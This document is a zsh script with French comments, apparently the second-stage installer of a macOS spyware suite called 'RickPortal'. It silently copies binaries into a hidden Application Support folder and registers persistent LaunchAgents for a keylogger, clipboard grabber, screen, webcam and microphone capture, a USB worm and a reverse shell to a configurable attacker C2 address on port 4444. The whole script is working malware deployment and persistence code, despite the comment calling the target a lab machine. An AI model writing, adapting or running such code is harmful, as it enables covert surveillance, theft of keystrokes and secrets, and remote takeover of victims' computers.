#!/bin/zsh
# delivery/stage2.sh - install SILENCIEUSE de toute la suite sur la machine cible lab
# Aucune fenetre, aucun prompt : LaunchAgents user-level (pas besoin de sudo).
# Un seul point a regler avant staging : l'IP du C2 ci-dessous.
ATTACKER_IP="${RICK_C2:-127.0.0.1}"
ATTACKER_PORT="4444"

cd "$(dirname "$0")/.." || exit 1
BASE="$HOME/Library/Application Support/RickPortal"
BINS="$BASE/bin"
AGENTS="$HOME/Library/LaunchAgents"
mkdir -p "$BINS" "$AGENTS"

# copie silencieuse des binaire hors des yeux du Finder
cp -f build/mac/* "$BINS/" 2>/dev/null
chmod +x "$BINS"/*

install_agent() {
    local label=$1 bin=$2 args=$3
    /usr/libexec/PlistBuddy -c "Clear dict" "/dev/null" 2>/dev/null
    cat > "$AGENTS/$label.plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>$label</string>
  <key>ProgramArguments</key><array>
    <string>$BINS/$bin</string>$args
  </array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict></plist>
EOF
    launchctl unload "$AGENTS/$label.plist" 2>/dev/null
    launchctl load "$AGENTS/$label.plist"
}

# ARG (3e param) = arguments passes au binaire ; vide = aucun
install_agent com.rick.keylog    01_keylogger     ""
install_agent com.rick.clip      04_clipboard     ""
install_agent com.rick.screen    07_screenspy     "<string>30</string>"
install_agent com.rick.cam       08_webcam        "<string>15</string>"
install_agent com.rick.mic       10_mic           ""
install_agent com.rick.usb       05_usb_worm      ""
install_agent com.rick.shell     02_reverse_shell "<string>$ATTACKER_IP</string><string>$ATTACKER_PORT</string>"

echo "installed"
